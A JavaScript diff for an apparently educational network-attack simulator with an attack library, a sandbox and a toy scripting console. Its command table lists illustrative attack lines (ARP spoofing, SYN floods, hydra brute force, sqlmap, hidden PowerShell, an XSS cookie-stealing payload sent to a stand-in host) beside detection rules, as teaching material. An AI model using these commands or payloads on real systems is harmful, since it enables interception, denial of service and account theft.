+    else { const from=sbPktFrom; sbPktFrom=null; sbRender(); if(from!==id){ const path=sbBFS(from,id); if(path) sbFly(path); else toast("No path between the devices"); } } }
+  else if(sbTool==="code"){ openEditor(id); }
+}
+function sbMove(e){ if(!sbDrag)return; const p=toSvg(e); const d=sbDev(sbDrag.id); if(!d)return;
+  d.x=clamp(p.x+sbDrag.ox,44,916); d.y=clamp(p.y+sbDrag.oy,48,398); sbDrag.moved=true; sbRender(); }
+function sbUp(){ window.removeEventListener("pointermove",sbMove); window.removeEventListener("pointerup",sbUp); sbDrag=null; }
+function sbAddLink(a,b){ if(!sbLinks.some(l=>(l[0]===a&&l[1]===b)||(l[0]===b&&l[1]===a))) sbLinks.push([a,b]); }
+function sbBFS(a,b){ const adj={}; for(const d of sbDevices) adj[d.id]=[]; for(const l of sbLinks){adj[l[0]].push(l[1]); adj[l[1]].push(l[0]);}
+  const q=[[a]], seen={}; seen[a]=1;
+  while(q.length){ const path=q.shift(); const last=path[path.length-1]; if(last===b) return path;
+    for(const nx of adj[last]||[]) if(!seen[nx]){seen[nx]=1; q.push(path.concat(nx));} } return null; }
+function sbFly(path){ sbAnimClear(); const pts=path.map(id=>{const d=sbDev(id);return{x:d.x,y:d.y};}); const {lens,total}=lensOf(pts);
+  const g=document.createElementNS(SVGNS,"g"); g.setAttribute("id","sbpkt");
+  g.innerHTML=`<circle r="11" fill="#FFA577" opacity="0.25"/><circle r="6" fill="#FFA577"/>`; svg.appendChild(g);
+  const dur=Math.max(900,total*2.4); let start=null,passes=0;
+  function fr(ts){ if(!start)start=ts; let t=(ts-start)/dur; if(t>=1){passes++; if(passes>=2){g.remove();sbAnim=null;return;} start=ts;t=0;}
+    const p=posAt(t,pts,lens,total); g.setAttribute("transform",`translate(${p.x},${p.y})`); sbAnim=requestAnimationFrame(fr); }
+  sbAnim=requestAnimationFrame(fr); }
+function sbInspect(){ const box=document.getElementById("sbInspector");
+  if(sbSel==null){ box.innerHTML='<div class="empty">Nothing selected. Pick ✋ Select / Move and click a device.</div>'; return; }
+  const d=sbDev(sbSel); if(!d){ box.innerHTML='<div class="empty">Nothing selected.</div>'; return; }
+  const links=sbLinks.filter(l=>l[0]===d.id||l[1]===d.id).length;
+  box.innerHTML=`<div class="field">Name<input id="fLabel" value="${esc(d.label)}"></div>
+    <div class="field">Address / label<input id="fSub" value="${esc(d.sub)}"></div>
+    <div class="field">Type: ${sbName[d.kind]} · links: ${links}</div>
+    <button class="ctl primary" id="edOpen" style="margin-right:8px">⌨ Open code</button>
+    <button class="ctl" id="fDel">Delete</button>`;
+  document.getElementById("fLabel").oninput=e=>{d.label=e.target.value; sbRender();};
+  document.getElementById("fSub").oninput=e=>{d.sub=e.target.value; sbRender();};
+  document.getElementById("edOpen").onclick=()=>openEditor(d.id);
+  document.getElementById("fDel").onclick=()=>{ sbDevices=sbDevices.filter(x=>x.id!==d.id); sbLinks=sbLinks.filter(l=>l[0]!==d.id&&l[1]!==d.id); sbSel=null; sbRender(); sbInspect(); };
+}
+function sbFreeSpot(){ for(let y=90;y<=380;y+=95) for(let x=110;x<=860;x+=125){ if(sbDevices.every(d=>Math.hypot(d.x-x,d.y-y)>115)) return {x,y}; } return {x:480,y:220}; }
+function sbAddDeviceAt(kind,x,y){ const d=sbMk(kind, clamp(x,44,916), clamp(y,48,398)); sbDevices.push(d); sbSel=d.id; sbSetTool("move"); sbRender(); sbInspect(); }
+function sbAddDevice(kind){ const sp=sbFreeSpot(); sbAddDeviceAt(kind,sp.x,sp.y); }
+function sbSetTool(t){ sbTool=t; sbLinkFrom=null; sbPktFrom=null; sbSyncTools(); sbRender(); }
+function sbSyncTools(){ document.querySelectorAll('#sbToolbar [data-tool]').forEach(b=>b.classList.toggle("on", b.dataset.tool===sbTool)); }
+
+let paletteBuilt=false;
+function buildPalette(){ if(paletteBuilt) return; paletteBuilt=true;
+  const pal=document.getElementById("palette"); let h="";
+  for(const k of PALETTE){ h+=`<div class="pal-item" draggable="true" data-kind="${k}"><svg viewBox="-48 -48 96 96">${iconMarkup(k)}</svg><span>${sbName[k]}</span></div>`; }
+  pal.innerHTML=h;
+  pal.querySelectorAll(".pal-item").forEach(it=>{ const k=it.dataset.kind;
+    it.addEventListener("dragstart",e=>{ dragKind=k; e.dataTransfer.setData("text/plain",k); e.dataTransfer.effectAllowed="copy"; });
+    it.addEventListener("click",()=>sbAddDevice(k));
+  });
+  const stage=document.getElementById("stage");
+  stage.addEventListener("dragover",e=>{ if(mode==="sandbox"){ e.preventDefault(); e.dataTransfer.dropEffect="copy"; stage.classList.add("drop-hi"); } });
+  stage.addEventListener("dragleave",()=>stage.classList.remove("drop-hi"));
+  stage.addEventListener("drop",e=>{ if(mode!=="sandbox")return; e.preventDefault(); stage.classList.remove("drop-hi");
+    const k=e.dataTransfer.getData("text/plain")||dragKind; if(!k)return; const p=toSvg(e); sbAddDeviceAt(k,p.x,p.y); });
+}
+
+// ---------- Hero ----------
+function buildHero(){
+  const h=document.getElementById("hero"); const C={x:250,y:250};
+  const orbit=[{kind:"cloud",x:250,y:70,lbl:"Internet"},{kind:"router",x:410,y:175,lbl:"Gateway"},{kind:"switch",x:395,y:380,lbl:"Switch"},{kind:"pc",x:120,y:385,lbl:"Host"},{kind:"attacker",x:90,y:175,lbl:"Attacker"}];
+  let s=`<defs>
+    <radialGradient id="shg" cx="50%" cy="35%" r="70%"><stop offset="0%" stop-color="#b48bff"/><stop offset="55%" stop-color="#6d3df0"/><stop offset="100%" stop-color="#3a1d8f"/></radialGradient>
+    <radialGradient id="glow" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="rgba(155,108,255,.45)"/><stop offset="100%" stop-color="rgba(155,108,255,0)"/></radialGradient>
+    <filter id="soft" x="-50%" y="-50%" width="200%" height="200%"><feGaussianBlur stdDeviation="3.2"/></filter></defs>`;
+  s+=`<circle cx="250" cy="245" r="230" fill="url(#glow)"/>`;
+  s+=`<ellipse cx="250" cy="250" rx="205" ry="195" fill="none" stroke="#3C3356" stroke-width="1.2" opacity="0.6"/>`;
+  s+=`<ellipse cx="250" cy="250" rx="150" ry="145" fill="none" stroke="#3C3356" stroke-width="1" opacity="0.4"/>`;
+  for(const o of orbit){ const col=o.kind==="attacker"?"#E11D29":"#2DD4BF";
+    s+=`<line x1="${C.x}" y1="${C.y}" x2="${o.x}" y2="${o.y}" stroke="${col}" stroke-width="1.6" opacity="0.55" stroke-dasharray="2 6" stroke-linecap="round"/>`;
+    const mx=(C.x+o.x)/2,my=(C.y+o.y)/2;
+    s+=`<circle cx="${mx}" cy="${my}" r="5" fill="${col}" filter="url(#soft)"/><circle cx="${mx}" cy="${my}" r="2.6" fill="#fff"/>`; }
+  s+=`<g transform="translate(${C.x},${C.y})">
+      <circle r="66" fill="url(#glow)" filter="url(#soft)"/>
+      <path d="M0 -60 L50 -40 V8 Q50 52 0 74 Q-50 52 -50 8 V-40 Z" fill="url(#shg)" stroke="#2DD4BF" stroke-width="2.5"/>
+      <path d="M0 -60 L50 -40 V8 Q50 52 0 74 Q-50 52 -50 8 V-40 Z" fill="none" stroke="rgba(255,255,255,.25)" stroke-width="1"/>
+      <path d="M-20 2 L-6 18 L24 -20" fill="none" stroke="#fff" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/></g>`;
+  for(const o of orbit){ s+=`<g transform="translate(${o.x},${o.y}) scale(0.8)">${iconMarkup(o.kind)}</g>`;
+    s+=`<text x="${o.x}" y="${o.y+38}" text-anchor="middle" font-size="11" fill="var(--stone)" font-family="JetBrains Mono, monospace">${o.lbl}</text>`; }
+  h.innerHTML=s;
+}
+
+// ---------- Sandbox simulation (Play) ----------
+let sbSimOn=false, sbSimRAF=null, sbSimStart=null;
+function sbSimStop(){ sbSimOn=false; const btn=document.getElementById("sbSim"); if(btn){btn.classList.remove("on"); btn.textContent="▶ Simulate";}
+  if(sbSimRAF)cancelAnimationFrame(sbSimRAF); sbSimRAF=null; const o=svg.querySelector("#sbsim"); if(o)o.remove(); }
+function sbSimToggle(){ if(sbSimOn){ sbSimStop(); return; }
+  if(!sbLinks.length){ toast("Add some cables first — use the 🔗 Wire tool"); return; }
+  sbSimOn=true; sbSimStart=null; const btn=document.getElementById("sbSim"); btn.classList.add("on"); btn.textContent="⏸ Stop";
+  sbSimRAF=requestAnimationFrame(sbSimLoop); }
+function sbSimLoop(ts){ if(!sbSimOn)return; const now=ts||performance.now(); if(!sbSimStart) sbSimStart=now;
+  let layer=svg.querySelector("#sbsim");
+  if(!layer){ layer=document.createElementNS(SVGNS,"g"); layer.setAttribute("id","sbsim");
+    sbLinks.forEach((lk,i)=>{ const c=document.createElementNS(SVGNS,"g"); c.setAttribute("data-i",i);
+      c.innerHTML=`<circle r="5.5" fill="#FFA577" opacity="0.9"/>`; layer.appendChild(c); });
+    svg.appendChild(layer);
+  }
+  const base=(now-sbSimStart)/1400;
+  layer.querySelectorAll("g[data-i]").forEach(c=>{ const lk=sbLinks[+c.dataset.i];
+    if(!lk){c.style.display="none";return;} const a=sbDev(lk[0]),b=sbDev(lk[1]);
+    if(!a||!b){c.style.display="none";return;} c.style.display="";
+    const t=(base+(+c.dataset.i)*0.18)%1; c.setAttribute("transform",`translate(${a.x+(b.x-a.x)*t},${a.y+(b.y-a.y)*t})`); });
+  sbSimRAF=requestAnimationFrame(sbSimLoop);
+}
+
+// ---------- Attack library gallery ----------
+const META={
+  arp:{cat:"spoof",target:"switch",short:"Poison ARP tables to sit in the middle of victim↔gateway traffic.",
+    how:"Every device on a LAN finds the MAC address for an IP by broadcasting an ARP request and trusting whatever reply comes back — there is no authentication. The attacker abuses this by sending unsolicited ARP replies claiming the gateway's IP is at the attacker's MAC, and the reverse to the gateway for the victim's IP. Both caches are poisoned, so frames meant for the gateway go to the attacker, who forwards them on and silently reads or alters the traffic (man-in-the-middle)."},
+  dhcp:{cat:"spoof",target:"server",short:"Drain the DHCP pool, then hand out a rogue gateway to intercept traffic.",
+    how:"When a device joins a network it broadcasts a DHCP DISCOVER and accepts the first OFFER it gets. The attacker first floods DISCOVERs with random MACs to lease every address in the real pool (starvation), so the real server can't answer. Then the attacker runs their own rogue DHCP server that answers new clients and hands out the attacker's IP as the default gateway, routing all of the victim's traffic through the attacker."},
+  mac:{cat:"spoof",target:"switch",short:"Overflow the switch CAM table so it floods frames and you can sniff.",
+    how:"A switch learns which MAC lives on which port and stores it in a fixed-size CAM table, forwarding frames only to the right port. The attacker floods the switch with frames using thousands of fake source MACs until the table overflows. With no room to learn, the switch 'fails open' and floods every frame to all ports like a hub, so the attacker receives copies of other hosts' traffic and can sniff it."},
+  dns:{cat:"spoof",target:"server",short:"Win the DNS reply race and redirect a domain to your own IP.",
+    how:"A DNS resolver accepts the first reply that matches its query's transaction ID and port. The attacker floods forged replies for the target domain, guessing the ID, so a malicious answer arrives before the real one. The victim caches the attacker's IP for that domain and connects to a fake site while the address bar still shows the real name."},
+  syn:{cat:"dos",target:"server",short:"Fill the server's half-open queue with spoofed SYNs until it's unreachable.",
+    how:"Opening a TCP connection takes a three-way handshake (SYN → SYN-ACK → ACK), and the server reserves memory in a half-open queue after the first SYN while it waits for the final ACK. The attacker sends a flood of SYNs from spoofed IPs and never sends the ACK, so every slot fills with connections that never complete. With the queue exhausted, the server can no longer accept new connections and real users are refused."},
+  icmp:{cat:"dos",target:"pc",short:"Flood ICMP echo requests until the host chokes on replies.",
+    how:"A host must answer every ICMP echo request (ping) with an echo reply. The attacker sends echo requests far faster than the host can handle, often from spoofed addresses, saturating both its CPU and its network link. Useful traffic is starved and the host becomes effectively unreachable — a simple volumetric denial of service."},
+  ddos:{cat:"dos",target:"server",short:"A botnet of thousands overwhelms a web server with traffic.",
+    how:"A botnet is a network of thousands of compromised devices the attacker controls remotely. On command they all send requests to the same server at once, producing traffic far beyond its capacity. The server and its link are saturated with junk, so real users' requests are lost in the flood and the site goes down — a distributed denial of service."},
+  ampl:{cat:"dos",target:"server",short:"Spoof the victim's IP to open resolvers — tiny queries, huge replies.",
+    how:"DNS runs over UDP, which doesn't verify the source address, and a small query can trigger a much larger reply. The attacker sends tiny queries to open resolvers but forges the source IP to be the victim's, so every large reply is sent to the victim. With thousands of resolvers each amplifying ~50×, the victim's link is flooded by traffic it never requested — a reflected, amplified DDoS."},
+  slow:{cat:"dos",target:"server",short:"Hold connections open with trickled headers to exhaust the pool.",
+    how:"A web server keeps a connection open while it waits for the full HTTP request to arrive. Slowloris opens many connections and sends the headers one byte at a time, extremely slowly, never finishing. Each connection holds a slot in the server's limited pool, and once every slot is taken no new visitors can connect — a denial of service that uses almost no bandwidth."},
+  brute:{cat:"cred",target:"server",short:"Hammer a login with password guesses until one works.",
+    how:"Many logins have no limit on failed attempts, so an attacker can try password after password. Using dictionaries, leaked-password lists and automation, they send thousands of guesses against a known account such as 'admin'. If the password is weak or reused, one guess eventually succeeds and the attacker gains the account — often the foothold for everything else."},
+  phishing:{cat:"social",target:"person",short:"Breach a whole company through one employee: phish them, own their PC, pivot inside.",
+    how:"Big breaches rarely start by attacking a firewall head-on — they start with one ordinary employee. The attacker emails a convincing lure (a fake invoice, HR notice or login page) and the firewall lets it in because email is normal traffic. The employee is tricked into opening the attachment or entering credentials, which runs malware on their PC — no software exploit needed, just the person. The malware calls back out to the attacker (outbound connections are usually allowed), giving a foothold, and from that trusted inside machine the attacker moves laterally to the valuable servers. This is why one careless click can compromise a whole company."},
+  sqli:{cat:"web",target:"server",short:"Inject SQL into a form field to make the database return data that isn't yours.",
+    how:"A web app often builds a database query by pasting user input straight into SQL text. The attacker types SQL fragments into a form field — for example ' OR '1'='1 — so the WHERE clause becomes always true and the query returns every row instead of just theirs. With more crafted input the attacker can dump entire tables (emails, password hashes) or change data, because the database can't tell the attacker's input from the developer's code."},
+  xss:{cat:"web",target:"pc",short:"Plant a script in a page so it runs in every visitor's browser and steals their session.",
+    how:"A site that shows user content without sanitizing it will also run any script hidden in that content. The attacker posts a comment containing a script tag; the server stores it and serves it to everyone who views the page. When a victim opens it, their browser executes the attacker's script in the site's context, letting it steal the session cookie, act as the victim, or redirect them — all from simply viewing a page."},
+  ransom:{cat:"malware",target:"server",short:"A user runs a malicious file; it encrypts their files and spreads to the servers.",
+    how:"Ransomware usually arrives the way phishing does — a user runs a malicious file. Once running it encrypts the user's files and then reaches across network shares and mapped drives to encrypt servers too, using the victim's own access rights. It leaves a ransom note demanding payment for the decryption key. Without offline backups and network segmentation, one infected workstation can lock an entire organization's data."},
+};
+// Commands / indicators (attack) vs detection & defense. Illustrative, recognition-level — no working payloads.
+const TERM={
+ arp:{attack:[["c","Attacker poisons ARP on the LAN with a standard tool"],["a","arpspoof -i eth0 -t 10.0.0.10 10.0.0.1   # tell the victim: gateway = me"],["a","arpspoof -i eth0 -t 10.0.0.1 10.0.0.10   # tell the gateway: victim = me"],["a","sysctl -w net.ipv4.ip_forward=1          # relay traffic so it stays silent"],["o","victim's ARP entry for 10.0.0.1 now shows the attacker's MAC"]],
+   defend:[["d","arp -a | awk '{print $4}' | sort | uniq -d   # same MAC on two IPs = poisoning"],["c","arpwatch / Suricata alert: 'ethernet mac changed'"],["d","switch: ip arp inspection vlan 10              # Dynamic ARP Inspection"],["d","switch: ip dhcp snooping                        # builds the trusted IP↔MAC table"],["o","forged ARP replies on untrusted ports are dropped"]]},
+ dhcp:{attack:[["a","dhcpstarv -i eth0           # flood DISCOVERs, lease out the whole pool"],["c","then run a rogue DHCP server that answers new clients"],["o","clients receive default gateway = 10.0.0.66 (attacker)"]],
+   defend:[["d","switch(if to server): ip dhcp snooping trust   # only this port may OFFER"],["c","any DHCP OFFER from another port is dropped & logged"],["d","detect: OFFER seen from an unexpected MAC/port"]]},
+ mac:{attack:[["a","macof -i eth0               # flood thousands of random source MACs"],["o","CAM table overflows → switch floods all frames to every port (sniffable)"]],
+   defend:[["d","switch(if): switchport port-security maximum 2"],["d","switch(if): switchport port-security violation shutdown"],["d","detect: ports going err-disabled, CAM table near capacity"]]},
+ dns:{attack:[["a","dnsspoof -i eth0 -f hosts.txt   # race a forged reply for bank.example"],["o","victim caches bank.example → 10.0.0.66"]],
+   defend:[["d","resolver: enable DNSSEC validation (dnssec-validation auto)"],["d","detect: two answers for one query, or an unexpected/low TTL"],["o","replies without a valid RRSIG signature are rejected"]]},
+ syn:{attack:[["a","hping3 -S --flood --rand-source -p 443 203.0.113.5"],["o","server half-open (SYN_RECV) queue fills; new connections refused"]],
+   defend:[["d","sysctl -w net.ipv4.tcp_syncookies=1            # no state until the ACK"],["d","ss -tn state syn-recv | wc -l                 # count half-open conns"],["d","firewall: connection-rate limit per source IP"]]},
+ icmp:{attack:[["a","hping3 --icmp --flood --rand-source 10.0.0.10"],["o","host CPU + link saturated answering echo requests"]],
+   defend:[["d","iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 100/s -j ACCEPT"],["d","iptables -A INPUT -p icmp --icmp-type echo-request -j DROP"],["d","detect: ICMP packets-per-second far above baseline"]]},
+ ddos:{attack:[["c","botnet C2 orders thousands of bots to hit one target at once"],["o","GET / HTTP/1.1  ×millions, from many different IPs"]],
+   defend:[["d","front with a CDN / scrubbing service; rate-limit per IP + geo/ASN"],["d","detect: req/s far above baseline, flood of brand-new source IPs"],["o","junk is filtered at the edge; only clean traffic reaches the origin"]]},
+ ampl:{attack:[["c","spoof the victim's IP as the source, query open resolvers"],["a","dig ANY example.com @open-resolver   # 60-byte query → ~3 KB reply to victim"],["o","thousands of resolvers each amplify ~50× onto the victim"]],
+   defend:[["d","ISP: BCP38 source-address filtering (uRPF) — drop spoofed source"],["d","resolver: allow-recursion { trusted; };   # close the open resolver"],["d","detect: inbound DNS answers for queries you never sent"]]},
+ slow:{attack:[["a","slowloris 203.0.113.5        # open many conns, trickle headers, never finish"],["o","every slot in the connection pool is held open"]],
+   defend:[["d","nginx: client_header_timeout 10s;  limit_conn perip 20;"],["d","put a reverse proxy / WAF in front to buffer full requests"],["d","ss -tn | grep ':443' | wc -l   # many conns stuck mid-request"]]},
+ brute:{attack:[["a","hydra -l admin -P wordlist.txt 203.0.113.5 https-post-form ..."],["o","thousands of login attempts against one account"]],
+   defend:[["d","grep 'Failed password' /var/log/auth.log | awk '{print $NF}' | sort | uniq -c"],["d","fail2ban: lock the account/IP after 5 failures"],["d","require MFA + rate-limit the login endpoint"]]},
+ phishing:{attack:[["c","1. lure email with a macro/exe attachment (invoice.xlsm)"],["o","user opens it and enables macros"],["c","2. the macro launches a hidden PowerShell — the classic red flag"],["a","powershell -nop -w hidden -enc <base64 payload>   # pull & run the implant"],["o","process tree: winword.exe → powershell.exe  (suspicious parent)"],["c","3. implant beacons out to C2 over 443 (looks like HTTPS)"],["c","4. pivot: reuse the employee's access to reach \\\\fileserver\\HR (SMB)"]],
+   defend:[["d","SIGMA: parent in {winword,excel,outlook}.exe AND child in {powershell,cmd}.exe → alert"],["d","Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' | ? {$_.Message -match '-enc'}"],["d","GPO: block macros from the internet; enable ASR rules + EDR"],["d","segment the staff VLAN from servers; least privilege on shares"],["d","detect lateral move: unusual host→server logon (Security EventID 4624/4672)"]]},
+ sqli:{attack:[["a","username field:  ' OR '1'='1' --        # make the WHERE clause always true"],["a","sqlmap -u 'https://site/login' --data='user=x' --dump   # automate extraction"],["o","query returns every row; the users table is dumped"]],
+   defend:[["d","use parameterized queries:  cursor.execute('… WHERE name=?', (name,))"],["d","give the DB account least privilege (read-only, scoped); add a WAF"],["d","detect: SQL errors or tautology patterns ( OR 1=1 , UNION SELECT ) in access logs"]]},
+ xss:{attack:[["a","comment body:  <script>new Image().src='//atk/c?'+document.cookie<\/script>"],["o","runs in every viewer's browser → their session cookie is sent to the attacker"]],
+   defend:[["d","output-encode all user content (HTML-escape on render)"],["d","header:  Content-Security-Policy: default-src 'self'   # blocks inline scripts"],["d","set cookies HttpOnly so scripts can't read them"],["d","detect: inputs containing <script>, onerror=, javascript:"]]},
+ ransom:{attack:[["o","user runs update.exe from a phishing email"],["c","encrypts local files, then reaches shares with the user's own rights"],["a","net use ; it enumerates and maps \\\\fileserver\\data"],["o","mass file writes + a ransom note (README.txt) dropped everywhere"]],
+   defend:[["d","EDR: alert/kill on mass file modification + known ransom extensions"],["d","keep offline, immutable backups (3-2-1) — restore instead of paying"],["d","segment the network; least-privilege share access per user"],["d","detect: a spike in SMB writes from a single host"]]},
+};
+function renderTerm(){
+  const panel=document.getElementById("termPanel"); if(!panel) return;
+  const t=(typeof TERM!=="undefined")?TERM[cur]:null;
+  if(!t){ panel.style.display="none"; return; } panel.style.display="";
+  const lines = defense ? t.defend : t.attack;
+  const title = defense ? "Detection & defense — how to catch and stop it" : "How it's typically done — commands & indicators";
+  const dot = defense ? "var(--teal)" : "var(--scarlet)";
+  const PFX={c:"//",a:"$",d:"#",o:"»"}, CLS={c:"l-c",a:"l-a",d:"l-d",o:"l-o"};
+  const body=lines.map(([ty,tx])=>`<span class="${CLS[ty]}"><span class="pfx">${PFX[ty]}</span>${esc(tx)}</span>`).join("\n");
+  panel.innerHTML=`<div class="term-head"><span class="dot" style="background:${dot}"></span>${title}</div><pre>${body}</pre>`;
+}
+const CATLABEL={spoof:"Interception / spoofing", dos:"DoS / DDoS", cred:"Credentials", web:"Web application", social:"Social / human", malware:"Malware"};
+function galPrev(key){ const m=META[key]; const col=m.cat==="dos"?"#F0B445":m.cat==="cred"?"#2DD4BF":"#E11D29";
+  return `<svg viewBox="0 0 280 118" width="100%" height="118" preserveAspectRatio="xMidYMid meet">
+    <line x1="88" y1="62" x2="196" y2="62" stroke="${col}" stroke-width="2" stroke-dasharray="3 7" stroke-linecap="round"/>
+    ${[112,142,172].map(x=>`<circle cx="${x}" cy="62" r="4" fill="${col}"/>`).join("")}
+    <g transform="translate(58,60) scale(0.78)">${iconMarkup("attacker")}</g>
+    <g transform="translate(220,60) scale(0.78)">${iconMarkup(m.target)}</g>
+  </svg>`; }
+function buildGallery(){
+  const grid=document.getElementById("galGrid");
+  const q=(document.getElementById("galSearch").value||"").toLowerCase().trim();
+  const f=document.getElementById("galFilter").value;
+  const keys=Object.keys(SCENARIOS).filter(k=>{ const m=META[k]; const nm=SCENARIOS[k].name.toLowerCase();
+    if(f!=="all"&&m.cat!==f) return false;
+    if(q && !(nm.includes(q)||k.includes(q)||m.short.toLowerCase().includes(q))) return false; return true; });
+  if(!keys.length){ grid.innerHTML='<div class="gal-empty">No attacks match your search.</div>'; return; }
+  grid.innerHTML=keys.map(k=>`<div class="gal-card" data-key="${k}">
+     <div class="prev">${galPrev(k)}</div>
+     <div class="body"><span class="chip ${META[k].cat}">${CATLABEL[META[k].cat]}</span>
+       <h3>${SCENARIOS[k].name}</h3><p>${META[k].short}</p></div></div>`).join("");
+  grid.querySelectorAll(".gal-card").forEach(c=>c.onclick=()=>openScenario(c.dataset.key));
+}
+
+// ---------- Menu & navigation ----------
+const MODES=[
+  {name:"Sandbox",desc:"Build your own network and attack layouts",ico:"▦",go:true,mode:"sandbox"},
+  {name:"Attack library",desc:"14 ready attacks with walkthroughs",ico:"☰",go:true,mode:"library"},
+  {name:"Lessons",desc:"Learn step by step",ico:"✎",go:false},
+  {name:"Challenges",desc:"Build the defense yourself",ico:"◎",go:false},
+  {name:"Community",desc:"Others' attack layouts",ico:"⚇",go:false},
+];
+function buildMenu(){ const nav=document.getElementById("nav"); nav.innerHTML="";
+  for(const m of MODES){ const b=document.createElement("button"); if(!m.go) b.classList.add("soon");
+    b.innerHTML=`<span class="ico">${m.ico}</span><span class="txt"><b>${m.name}</b><span>${m.desc}</span></span>${m.go?'':'<span class="badge">soon</span>'}`;
+    b.onclick=()=>{ if(!m.go){ toast("The “"+m.name+"” section is coming soon"); return; } m.mode==="library"?openGallery():openSim("sandbox"); };
+    nav.appendChild(b); } }
+let toastTimer=null;
+function toast(msg){ const t=document.getElementById("toast"); t.textContent=msg; t.classList.add("show"); clearTimeout(toastTimer); toastTimer=setTimeout(()=>t.classList.remove("show"),2200); }
+function showScreen(name){ for(const s of ["menu","gallery","sim"]) document.getElementById(s).classList.toggle("active",s===name); window.scrollTo(0,0); }
+let sbReady=false, mode="library", simFrom="menu";
+function show(id,on){ document.getElementById(id).style.display=on?"":"none"; }
+function setMode(m){ mode=m; const lib=m==="library";
+  show("libScenario",lib); show("sbTitle",!lib); show("libControls",lib); show("sbToolbar",!lib); show("libSide",lib); show("sbSide",!lib);
+  if(lib){ sbSimStop(); sbAnimClear(); document.getElementById("scenario").value=cur||"arp"; loadScenario(cur||"arp"); }
+  else { stopPlay(); clearPacket(); buildPalette(); if(!sbReady){ sbInit(); sbReady=true; } else sbRender(); }
+}
+function setBack(){ const b=document.getElementById("toMenu"); b.textContent = simFrom==="gallery" ? "← Library" : "← Menu"; }
+function openGallery(){ showScreen("gallery"); buildGallery(); }
+function openScenario(key){ cur=key; simFrom="gallery"; setBack(); showScreen("sim"); setMode("library"); }
+function openSim(m){ simFrom="menu"; setBack(); showScreen("sim"); setMode(m); }
+
+document.getElementById("toMenu").onclick=()=>{ stopPlay(); sbAnimClear(); sbSimStop(); showScreen(simFrom==="gallery"?"gallery":"menu"); if(simFrom==="gallery") buildGallery(); };
+document.getElementById("galBack").onclick=()=>showScreen("menu");
+document.getElementById("galSearch").oninput=buildGallery;
+document.getElementById("galFilter").onchange=buildGallery;
+document.getElementById("prev").onclick=()=>{stopPlay(); showStep(idx-1);};
+document.getElementById("next").onclick=()=>{stopPlay(); showStep(idx+1);};
+document.getElementById("play").onclick=play;
+document.getElementById("defense").onclick=()=>setDefense(!defense);
+document.getElementById("scenario").onchange=e=>loadScenario(e.target.value);
+document.querySelectorAll('#sbToolbar [data-tool]').forEach(b=>b.onclick=()=>sbSetTool(b.dataset.tool));
+document.getElementById("sbSim").onclick=sbSimToggle;
+document.getElementById("sbClear").onclick=()=>{ sbSimStop(); sbDevices=[];sbLinks=[];sbSel=null;sbLinkFrom=null;sbPktFrom=null; sbRender(); sbInspect(); };
+
+// ---------- VoidScript: safe in-simulation interpreter (no eval, can't touch the page) ----------
+let edHost=null, edVars={}, edLastPath=null, edCodeStore={};
+function edOut(kind,msg){ const pre=document.getElementById("edConsole"); const c={ok:"#2DD4BF",blk:"#F0B445",info:"#EBD1A8",err:"#E11D29"}[kind]||"#F6F5FC"; const s=document.createElement("span"); s.style.color=c; s.style.display="block"; s.textContent=msg; pre.appendChild(s); pre.scrollTop=pre.scrollHeight; }
+function edClear(){ document.getElementById("edConsole").innerHTML=""; }
+function edResetState(){ sbDevices.forEach(d=>{d.hacked=false; d.def=new Set();}); sbRender(); edOut("info","state reset — all hosts clean, defenses cleared"); }
+function edTok(line){ const out=[]; const re=/"([^"]*)"|(\S+)/g; let m; while((m=re.exec(line))){ out.push(m[1]!==undefined?('"'+m[1]+'"'):m[2]); } return out; }
+function edSub(t){ return t.replace(/\$([A-Za-z_]\w*)/g,(_,n)=> edVars[n]!==undefined?edVars[n]:("$"+n)); }
+function unq(t){ return edSub(t).replace(/^"|"$/g,""); }
+function edFind(name){ const q=unq(name).toLowerCase(); return sbDevices.find(x=>x.label.toLowerCase()===q); }
+function edResolve(name){ const d=edFind(name); if(!d) throw new Error("unknown device: "+unq(name)); return d; }
+function edAnyDef(x){ return sbDevices.some(d=>d.def&&d.def.has(x)); }
+function edSwitches(){ return sbDevices.filter(d=>d.kind==="switch"); }
+function edFwDef(x){ return sbDevices.some(d=>(d.kind==="firewall"||d.kind==="router")&&d.def&&d.def.has(x)); }
+function edReach(d){ const p=sbBFS(edHost,d.id); if(!p){ edOut("err","no route to "+d.label); return null;} edLastPath=p; return p; }
+function edExec(line){
+  const tk=edTok(line); const verb=edSub(tk[0]).toLowerCase();
+  if(verb==="set"){ const name=tk[1]; const eq=tk.indexOf("="); const val= eq>=0? tk.slice(eq+1).map(unq).join(" ") : unq(tk[2]||""); edVars[name]=val; edOut("info",name+" = "+val); return; }
+  if(verb==="print"){ edOut("info", tk.slice(1).map(unq).join(" ")); return; }
+  const args=[], kv={};
+  for(let i=1;i<tk.length;i++){ const raw=tk[i];
+    if(raw==="on"){ kv._on=unq(tk[++i]||""); continue; } if(raw==="as"){ kv._as=unq(tk[++i]||""); continue; }
+    if(raw==="from"){ kv._from=unq(tk[++i]||""); continue; } if(raw==="to"){ kv._to=unq(tk[++i]||""); continue; }
+    if(raw.indexOf("=")>0 && raw[0]!=='"'){ const p=raw.indexOf("="); kv[raw.slice(0,p).toLowerCase()]=unq(raw.slice(p+1)); }
+    else args.push(raw); }
+  const first=()=>edResolve(args[0]);
+  switch(verb){
+    case "ping": { const d=first(); if(edReach(d)) edOut("ok","[ok] reply from "+d.label); break; }
+    case "scan": { const d=first(); if(edReach(d)) edOut("ok","[ok] "+d.label+" — open ports: 22, 80, 443"); break; }
+    case "arpspoof": { const d=first(); if(!edReach(d))break; if(edSwitches().some(s=>s.def.has("dai"))) edOut("blk","[blocked] Dynamic ARP Inspection dropped the forged reply"); else { d.hacked=true; edOut("ok","[compromised] MITM on "+d.label+(kv._as?(" (posing as "+kv._as+")"):"")); } break; }
+    case "macflood": { const sw=edSwitches()[0]; if(sw&&!edReach(sw))break; if(edSwitches().some(s=>s.def.has("port-security"))) edOut("blk","[blocked] port-security shut the port (err-disabled)"); else { sbDevices.forEach(x=>{ if(x.kind==="pc"||x.kind==="person") x.hacked=true; }); edOut("ok","[compromised] CAM overflow — switch is flooding, traffic sniffable"); } break; }
